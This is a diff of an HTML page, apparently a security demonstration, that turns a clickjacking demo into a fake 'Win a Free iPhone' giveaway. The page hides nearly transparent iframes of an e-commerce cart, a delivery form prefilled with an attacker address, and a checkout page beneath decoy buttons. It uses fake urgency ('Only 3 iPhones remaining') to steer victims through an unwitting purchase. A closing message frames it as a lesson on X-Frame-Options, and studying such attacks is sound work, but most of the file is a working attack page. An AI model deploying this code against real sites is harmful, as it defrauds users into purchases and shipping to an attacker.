@@ -3,74 +3,289 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multistep Clickjacking Demo</title>
+    <title>Win a Free iPhone! - Limited Time Offer</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .decoy-button {
+            z-index: 100;
+            position: fixed;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .hidden-iframe {
+            position: absolute;
+            opacity: 0.01; /* Nearly invisible */
+            pointer-events: auto;
+            z-index: 10;
+        }
+        .overlay-content {
+            position: relative;
+            z-index: 5;
+            pointer-events: none;
+        }
+    </style>
 </head>
-<body class="bg-gray-100 font-sans flex flex-col items-center justify-center min-h-screen p-4 overflow-hidden">
-    <div class="bg-white shadow-lg rounded-lg p-6 max-w-2xl text-center z-10 mb-4">
-        <h1 class="text-3xl font-bold text-gray-800 mb-2 animate-pulse">🎁 Claim Your Free Gift Now!</h1>
-        <p class="text-lg text-gray-600">Hurry! Click the buttons below to unlock your exclusive offer!</p>
+<body class="bg-gradient-to-r from-blue-100 to-purple-100 font-sans min-h-screen">
+    <!-- Fake website content -->
+    <div class="overlay-content w-full">
+        <header class="bg-white shadow-md p-4">
+            <div class="container mx-auto flex justify-between items-center">
+                <h1 class="text-2xl font-bold text-blue-600">iPhone Giveaway</h1>
+                <div class="space-x-2">
+                    <span class="text-sm text-gray-500">Limited time offer!</span>
+                    <span class="bg-red-500 text-white text-xs px-2 py-1 rounded-full animate-pulse">LIVE</span>
+                </div>
+            </div>
+        </header>
+        
+        <main class="container mx-auto p-4 mt-8">
+            <div class="max-w-2xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden">
+                <div class="p-6">
+                    <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">🎉 Win a Free iPhone 15 Pro Max! 🎉</h2>
+                    
+                    <div class="flex justify-center mb-8">
+                        <img src="/api/placeholder/300/400" alt="iPhone 15" class="rounded-lg shadow-md h-64 object-cover"/>
+                    </div>
+                    
+                    <div class="text-center mb-8">
+                        <p class="text-gray-600 mb-4">You've been selected for our exclusive iPhone giveaway! Follow these simple steps to claim your prize:</p>
+                        
+                        <ol class="text-left text-gray-700 space-y-3 mx-auto max-w-md">
+                            <li class="flex items-center">
+                                <span class="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2">1</span>
+                                <span>Click the "Next" button to confirm your participation</span>
+                            </li>
+                            <li class="flex items-center">
+                                <span class="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2">2</span>
+                                <span>Verify your shipping details on the next screen</span>
+                            </li>
+                            <li class="flex items-center">
+                                <span class="bg-blue-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2">3</span>
+                                <span>Confirm your prize selection to complete your entry</span>
+                            </li>
+                        </ol>
+                    </div>
+                    
+                    <div class="text-center mb-4">
+                        <p class="text-sm text-gray-500">Only <span class="font-bold text-red-500">3 iPhones</span> remaining! 926 people are viewing this offer right now.</p>
+                    </div>
+                    
+                    <div class="flex justify-center">
+                        <div id="step1Button" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-lg shadow-lg transition-colors text-xl">
+                            Start Now!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <div id="step2Content" class="hidden container mx-auto p-4 mt-8">
+            <div class="max-w-2xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden">
+                <div class="p-6">
+                    <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">📋 Verify Your Shipping Information</h2>
+                    
+                    <div class="text-center mb-8">
+                        <p class="text-gray-600 mb-4">We need to confirm where to send your new iPhone!</p>
+                        
+                        <div class="bg-gray-100 p-4 rounded-lg mb-6 text-left">
+                            <h3 class="font-bold text-gray-700 mb-2">Your Details:</h3>
+                            <p class="text-gray-600">123 Main Street, Anytown, USA</p>
+                        </div>
+                        
+                        <p class="text-sm text-gray-500 mb-6">Click "Confirm Address" below to verify this is correct</p>
+                    </div>
+                    
+                    <div class="flex justify-center">
+                        <div id="step2Button" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-lg shadow-lg transition-colors text-xl">
+                            Confirm Address
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="step3Content" class="hidden container mx-auto p-4 mt-8">
+            <div class="max-w-2xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden">
+                <div class="p-6">
+                    <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">🎁 Claim Your iPhone Now!</h2>
+                    
+                    <div class="text-center mb-8">
+                        <div class="flex justify-center mb-6">
+                            <img src="/api/placeholder/300/200" alt="iPhone Package" class="rounded-lg shadow-md h-40 object-cover"/>
+                        </div>
+                        
+                        <p class="text-gray-600 mb-4">You're almost done! Click the button below to finalize your entry and claim your free iPhone 15 Pro Max!</p>
+                        
+                        <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6 text-left">
+                            <p class="text-yellow-700">Your iPhone will be shipped within 3-5 business days after confirmation.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-center">
+                        <div id="step3Button" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-lg shadow-lg transition-colors text-xl">
+                            Claim My iPhone!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div id="completionMessage" class="hidden container mx-auto p-4 mt-8">
+            <div class="max-w-2xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden">
+                <div class="p-6 text-center">
+                    <h2 class="text-3xl font-bold text-red-600 mb-6">Clickjacking Demonstration Complete!</h2>
+                    <p class="text-gray-700 mb-4">If this were a real attack, you would have just:</p>
+                    <ol class="text-left text-gray-700 space-y-2 mx-auto max-w-md mb-6">
+                        <li class="flex items-start">
+                            <span class="bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2 mt-1">1</span>
+                            <span>Proceeded through checkout on an e-commerce site</span>
+                        </li>
+                        <li class="flex items-start">
+                            <span class="bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2 mt-1">2</span>
+                            <span>Confirmed shipping to the attacker's address</span>
+                        </li>
+                        <li class="flex items-start">
+                            <span class="bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center mr-2 mt-1">3</span>
+                            <span>Completed a purchase without realizing it</span>
+                        </li>
+                    </ol>
+                    <p class="text-gray-600">This demonstration shows why websites implement frame-busting techniques and why the X-Frame-Options header is important.</p>
+                </div>
+            </div>
+        </div>
     </div>
-    <div id="iframe-wrapper" class="fixed top-[204px] left-1/2 transform -translate-x-1/2 translate-x-[20px] w-[600px] h-[800px] max-w-[90vw] max-h-[80vh] z-0">
-        <iframe id="iframe-cart" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
-        <iframe id="iframe-delivery" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none hidden" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
-        <iframe id="iframe-checkout" class="absolute top-0 left-0 w-full h-full opacity-0.1 z-10 cursor-none hidden" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
+
+    <!-- Hidden iframes for clickjacking -->
+    <div id="frameContainer">
+        <!-- Initial iframe positioned for first click -->
+        <iframe id="cartIframe" src="https://security-in-e-commerce.onrender.com/cart" class="hidden-iframe" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
+        <!-- Will be activated after first click -->
+        <iframe id="deliveryIframe" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" class="hidden-iframe hidden" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
+        <!-- Will be activated after second click -->
+        <iframe id="checkoutIframe" src="https://security-in-e-commerce.onrender.com/checkout" class="hidden-iframe hidden" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
     </div>
-    <div class="firstClick fixed bottom-[40px] right-[40px] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me first</div>
-    <div id="secondClick" class="secondClick hidden fixed top-[424px] left-[calc(50%+45px)] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me next</div>
-    <div class="thirdClick hidden fixed bottom-[40px] right-[40px] z-20 bg-red-500 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:bg-red-600 transition-colors cursor-pointer animate-bounce">Click me last</div>
+
+    <!-- Decoy buttons that align with the real buttons in the iframes -->
+    <div id="step1DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Next</div>
+    <div id="step2DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Confirm</div>
+    <div id="step3DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Complete</div>
+
     <script>
-        let currentStep = 'cart';
-
-        // Kiểm tra nếu iframe không load
-        function checkIframeLoaded(iframeId) {
-            const iframe = document.getElementById(iframeId);
-            iframe.onerror = () => {
-                alert('Oops! Something went wrong. Please click again to claim your gift!');
-            };
-        }
-
-        // Tự động di chuyển con trỏ đến nút giả
-        function simulateMouseMoveToButton(buttonClass) {
-            const button = document.querySelector(`.${buttonClass}:not(.hidden)`);
-            if (button) {
-                const rect = button.getBoundingClientRect();
-                const mouseEvent = new MouseEvent('mousemove', {
-                    clientX: rect.left + rect.width / 2,
-                    clientY: rect.top + rect.height / 2,
-                    bubbles: true
-                });
-                document.dispatchEvent(mouseEvent);
-            }
-        }
-
-        function nextStep(step) {
-            document.getElementById(`iframe-${step}`).classList.add('hidden');
-            document.getElementById(`${step}Click`).classList.add('hidden');
-
-            if (step === 'cart') {
-                currentStep = 'delivery';
-                document.getElementById('iframe-delivery').classList.remove('hidden');
-                document.getElementById('secondClick').classList.remove('hidden');
-                checkIframeLoaded('iframe-delivery');
-                setTimeout(() => simulateMouseMoveToButton('secondClick'), 500);
-            } else if (step === 'delivery') {
-                currentStep = 'checkout';
-                document.getElementById('iframe-checkout').classList.remove('hidden');
-                document.getElementById('thirdClick').classList.remove('hidden');
-                checkIframeLoaded('iframe-checkout');
-                setTimeout(() => simulateMouseMoveToButton('thirdClick'), 500);
-            } else if (step === 'checkout') {
-                alert('You completed the clickjacking attack!');
-            }
-        }
-
-        // Kiểm tra iframe đầu tiên và di chuyển con trỏ
-        window.onload = () => {
-            checkIframeLoaded('iframe-cart');
-            setTimeout(() => simulateMouseMoveToButton('firstClick'), 500);
+        // Track current step
+        let currentStep = 1;
+        
+        // Initial setup
+        window.onload = function() {
+            positionDecoyButtons();
+            window.addEventListener('resize', positionDecoyButtons);
+            
+            // Set up the click handlers for the visible content buttons
+            document.getElementById('step1Button').addEventListener('click', function() {
+                goToStep(2);
+                setTimeout(function() {
+                    positionDecoyButtons();
+                }, 100);
+            });
+            
+            document.getElementById('step2Button').addEventListener('click', function() {
+                goToStep(3);
+                setTimeout(function() {
+                    positionDecoyButtons();
+                }, 100);
+            });
+            
+            document.getElementById('step3Button').addEventListener('click', function() {
+                showCompletionMessage();
+            });
+            
+            // Set up handlers for the decoy buttons that trigger the iframe clicks
+            document.getElementById('step1DecoyButton').addEventListener('click', function() {
+                document.getElementById('cartIframe').classList.add('hidden');
+                document.getElementById('step1DecoyButton').classList.add('hidden');
+                document.getElementById('deliveryIframe').classList.remove('hidden');
+                document.getElementById('step2DecoyButton').classList.remove('hidden');
+                positionDecoyButtons();
+            });
+            
+            document.getElementById('step2DecoyButton').addEventListener('click', function() {
+                document.getElementById('deliveryIframe').classList.add('hidden');
+                document.getElementById('step2DecoyButton').classList.add('hidden');
+                document.getElementById('checkoutIframe').classList.remove('hidden');
+                document.getElementById('step3DecoyButton').classList.remove('hidden');
+                positionDecoyButtons();
+            });
+            
+            document.getElementById('step3DecoyButton').addEventListener('click', function() {
+                document.getElementById('checkoutIframe').classList.add('hidden');
+                document.getElementById('step3DecoyButton').classList.add('hidden');
+                showCompletionMessage();
+            });
+            
+            // Show the first decoy button
+            document.getElementById('step1DecoyButton').classList.remove('hidden');
         };
+        
+        // Function to position the decoy buttons over the real buttons in the iframes
+        function positionDecoyButtons() {
+            const cartIframe = document.getElementById('cartIframe');
+            const deliveryIframe = document.getElementById('deliveryIframe');
+            const checkoutIframe = document.getElementById('checkoutIframe');
+            
+            // Position for "Proceed to Checkout" button in cart
+            if (currentStep === 1) {
+                const decoyButton = document.getElementById('step1DecoyButton');
+                const iframeRect = cartIframe.getBoundingClientRect();
+                decoyButton.style.bottom = "100px";
+                decoyButton.style.right = "100px";
+            }
+            
+            // Position for "Submit Address" button in delivery
+            if (currentStep === 2) {
+                const decoyButton = document.getElementById('step2DecoyButton');
+                const iframeRect = deliveryIframe.getBoundingClientRect();
+                decoyButton.style.top = (iframeRect.top + 320) + "px";
+                decoyButton.style.left = (iframeRect.left + 150) + "px";
+            }
+            
+            // Position for "Confirm Purchase" button in checkout
+            if (currentStep === 3) {
+                const decoyButton = document.getElementById('step3DecoyButton');
+                const iframeRect = checkoutIframe.getBoundingClientRect();
+                decoyButton.style.bottom = "100px";
+                decoyButton.style.right = "100px";
+            }
+        }
+        
+        // Function to change the visible step
+        function goToStep(step) {
+            currentStep = step;
+            
+            // Hide all content sections first
+            document.getElementById('step1Content').classList.add('hidden');
+            document.getElementById('step2Content').classList.add('hidden');
+            document.getElementById('step3Content').classList.add('hidden');
+            
+            // Show the current step content
+            if (step === 2) {
+                document.getElementById('step2Content').classList.remove('hidden');
+                document.querySelector('main').classList.add('hidden');
+            } else if (step === 3) {
+                document.getElementById('step3Content').classList.remove('hidden');
+            }
+        }
+        
+        // Function to show completion message
+        function showCompletionMessage() {
+            document.getElementById('step1Content').classList.add('hidden');
+            document.getElementById('step2Content').classList.add('hidden');
+            document.getElementById('step3Content').classList.add('hidden');
+            document.getElementById('completionMessage').classList.remove('hidden');
+        }
     </script>
-    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93c3eff54aad8bb6',t:'MTc0NjY1NDY3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
